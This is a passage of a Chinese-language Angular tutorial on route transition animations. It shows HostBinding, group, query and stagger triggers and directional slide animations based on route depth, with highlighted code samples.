  templateUrl<span class="token operator">:</span> <span class="token string">&quot;./project-list.component.html&quot;</span><span class="token punctuation">,</span>
  styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;./project-list.component.scss&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  animations<span class="token operator">:</span><span class="token punctuation">[</span>
    slideToRight
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ProjectListComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  @<span class="token function">HostBinding</span><span class="token punctuation">(</span><span class="token string">'@routeAnim'</span><span class="token punctuation">)</span> state<span class="token punctuation">;</span><span class="token comment">// &lt;--------</span>
<span class="token punctuation">}</span>
<span class="token comment">// task-home</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">&quot;app-task-home&quot;</span><span class="token punctuation">,</span>
  templateUrl<span class="token operator">:</span> <span class="token string">&quot;./task-home.component.html&quot;</span><span class="token punctuation">,</span>
  styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">&quot;./task-home.component.scss&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  animations<span class="token operator">:</span><span class="token punctuation">[</span>
    slideToRight
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">TaskHomeComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
     @<span class="token function">HostBinding</span><span class="token punctuation">(</span><span class="token string">'@routeAnim'</span><span class="token punctuation">)</span> state<span class="token punctuation">;</span><span class="token comment">// &lt;--------</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>定义路由,切换的时候就会产生路由转场动画</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mat-list-item</span> <span class="token attr-name">[routerLink]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>['/project']<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mat-icon</span> <span class="token attr-name">mat-list-icon</span> <span class="token attr-name">svgIcon</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>projects<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mat-icon</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span> <span class="token attr-name">mat-line</span><span class="token punctuation">&gt;</span></span>项目首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">mat-line</span> <span class="token attr-name">mat-subheader</span><span class="token punctuation">&gt;</span></span> 查看您的所有项目<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mat-list-item</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mat-list-item</span> <span class="token attr-name">[routerLink]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>['/task']<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mat-icon</span> <span class="token attr-name">mat-list-icon</span> <span class="token attr-name">svgIcon</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>projects<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mat-icon</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span> <span class="token attr-name">mat-line</span><span class="token punctuation">&gt;</span></span>任务首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">mat-line</span> <span class="token attr-name">mat-subheader</span><span class="token punctuation">&gt;</span></span> 查看您的所有项目<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mat-list-item</span><span class="token punctuation">&gt;</span></span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>给一个组件整体绑定一个动画使用HostBinding</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">HostBinding</span><span class="token punctuation">(</span><span class="token string">'@card'</span><span class="token punctuation">)</span> cardState <span class="token operator">=</span> <span class="token string">'out'</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div></div> <h3 id="group-stagger"><a href="#group-stagger" class="header-anchor">#</a> Group/Stagger</h3> <p><code>group([animate(...),animate(...)...])</code>接收一个数组，数组里写多个动画。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> trigger<span class="token punctuation">,</span> state<span class="token punctuation">,</span> transition<span class="token punctuation">,</span> style<span class="token punctuation">,</span> animate<span class="token punctuation">,</span> group<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/animations'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> slideToRight <span class="token operator">=</span> <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'routeAnim'</span><span class="token punctuation">,</span><span class="token punctuation">[</span>
    <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'void'</span><span class="token punctuation">,</span><span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'position'</span><span class="token operator">:</span><span class="token string">'fixed'</span><span class="token punctuation">,</span><span class="token string">'width'</span><span class="token operator">:</span><span class="token string">'100%'</span><span class="token punctuation">,</span><span class="token string">'height'</span><span class="token operator">:</span><span class="token string">'80%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'position'</span><span class="token operator">:</span><span class="token string">'fixed'</span><span class="token punctuation">,</span><span class="token string">'width'</span><span class="token operator">:</span><span class="token string">'100%'</span><span class="token punctuation">,</span><span class="token string">'height'</span><span class="token operator">:</span><span class="token string">'80%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">':enter'</span><span class="token punctuation">,</span><span class="token punctuation">[</span>
        <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>transform<span class="token operator">:</span><span class="token string">'translateX(-100%)'</span><span class="token punctuation">,</span>opacity<span class="token operator">:</span><span class="token string">'0'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'.5s ease-in-out'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>transform<span class="token operator">:</span><span class="token string">'translateX(0)'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'.3s ease-in'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>opacity<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">':leave'</span><span class="token punctuation">,</span><span class="token punctuation">[</span>
        <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>transform<span class="token operator">:</span><span class="token string">'translateX(0)'</span><span class="token punctuation">,</span>opacity<span class="token operator">:</span><span class="token string">'1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'.5s ease-in-out'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>transform<span class="token operator">:</span><span class="token string">'translateX(100%)'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'.3s ease-in'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>opacity<span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>Query用于父节点寻找子节点，把动画应用到选中元素。Stagger指定有多个满足Query的元素，每个的动画之间有间隔。比如进场动画，先隐藏起来，通过stagger间隔1000s做一个1s的动画。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> trigger<span class="token punctuation">,</span> state<span class="token punctuation">,</span> transition<span class="token punctuation">,</span> style<span class="token punctuation">,</span> animate<span class="token punctuation">,</span> query<span class="token punctuation">,</span> animation<span class="token punctuation">,</span>stagger<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/animations'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> listAnimation <span class="token operator">=</span> <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'listAnim'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'* =&gt; *'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
      <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':enter'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>opacity<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//加入optional为true,后面的状态动画都是可选的</span>
      <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':enter'</span><span class="token punctuation">,</span> <span class="token function">stagger</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
        <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'1s'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>opacity<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':leave'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>opacity<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':leave'</span><span class="token punctuation">,</span> <span class="token function">stagger</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
        <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'1s'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>opacity<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>一般应用query动画跟*ngFor在一起的，外面套一层div。Stagger使得在多个元素时候，动画交错开，而不是一起。</p> <h3 id="左前进右后退"><a href="#左前进右后退" class="header-anchor">#</a> 左前进右后退</h3> <p>上面全局路由的全部动画都是左滑，如果我们想要实现进去路由左滑，退出路由右滑怎么处理呢？我们可以增加两个动画动态控制使用哪个。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// app.component.ts</span>
<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;container&quot;</span> <span class="token punctuation">[</span>@routeAnimations<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;prepareRoute(outlet)&quot;</span> <span class="token punctuation">[</span>@routeAnimationBack<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;prepareRoute(outlet)&quot;</span><span class="token operator">&gt;</span>  👈 增加两个动画动态控制
  <span class="token operator">&lt;</span>router<span class="token operator">-</span>outlet #outlet<span class="token operator">=</span><span class="token string">&quot;outlet&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>router<span class="token operator">-</span>outlet<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>
  trigger<span class="token punctuation">,</span> animateChild<span class="token punctuation">,</span> group<span class="token punctuation">,</span>
  transition<span class="token punctuation">,</span> animate<span class="token punctuation">,</span> style<span class="token punctuation">,</span> query
<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/animations'</span><span class="token punctuation">;</span>
<span class="token comment">// 增加层级判断是否应用哪个动画</span>
<span class="token keyword">const</span> <span class="token function-variable function">getIndex</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">str<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token comment">//  👈 获取层级</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">// 从左往右滑</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> slideFromTo <span class="token operator">=</span>
  <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'routeAnimations'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token function">transition</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">fromState<span class="token punctuation">,</span> toState</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> fromIdx <span class="token operator">=</span> <span class="token function">getIndex</span><span class="token punctuation">(</span>fromState<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> toIdx <span class="token operator">=</span> <span class="token function">getIndex</span><span class="token punctuation">(</span>toState<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>fromIdx <span class="token operator">&amp;&amp;</span> toIdx<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> fromIdx <span class="token operator">&lt;</span> toIdx<span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// 👈   应用从右往左滑动，放弃这个动画</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
      <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span> position<span class="token operator">:</span> <span class="token string">'relative'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':enter, :leave'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
        <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
          position<span class="token operator">:</span> <span class="token string">'absolute'</span><span class="token punctuation">,</span>
          top<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
          left<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
          width<span class="token operator">:</span> <span class="token string">'100%'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':enter'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
        <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span> left<span class="token operator">:</span> <span class="token string">'100%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':leave'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
        <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span> left<span class="token operator">:</span> <span class="token string">'0%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
        <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':leave'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
          <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'300ms ease-out'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span> left<span class="token operator">:</span> <span class="token string">'-100%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':enter'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
          <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'300ms ease-out'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span> left<span class="token operator">:</span> <span class="token string">'0%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 从右往左滑</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> slideToFrom <span class="token operator">=</span>
  <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'routeAnimationBack'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token function">transition</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">fromState<span class="token punctuation">,</span> toState</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> fromIdx <span class="token operator">=</span> <span class="token function">getIndex</span><span class="token punctuation">(</span>fromState<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> toIdx <span class="token operator">=</span> <span class="token function">getIndex</span><span class="token punctuation">(</span>toState<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>fromIdx <span class="token operator">&amp;&amp;</span> toIdx<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> fromIdx <span class="token operator">&gt;</span> toIdx<span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token comment">//  👈  应用从左往右滑动，放弃这个动画</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
      <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span> position<span class="token operator">:</span> <span class="token string">'relative'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':enter, :leave'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
        <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
          position<span class="token operator">:</span> <span class="token string">'absolute'</span><span class="token punctuation">,</span>
          top<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
          left<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
          width<span class="token operator">:</span> <span class="token string">'100%'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':enter'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
        <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span> left<span class="token operator">:</span> <span class="token string">'-100%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':leave'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
        <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span> left<span class="token operator">:</span> <span class="token string">'0%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token comment">// query(':leave', animateChild(), { optional: true }),</span>
      <span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
        <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':leave'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
          <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'300ms ease-out'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span> left<span class="token operator">:</span> <span class="token string">'100%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">':enter'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
          <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'300ms ease-out'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span> left<span class="token operator">:</span> <span class="token string">'0%'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> optional<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span 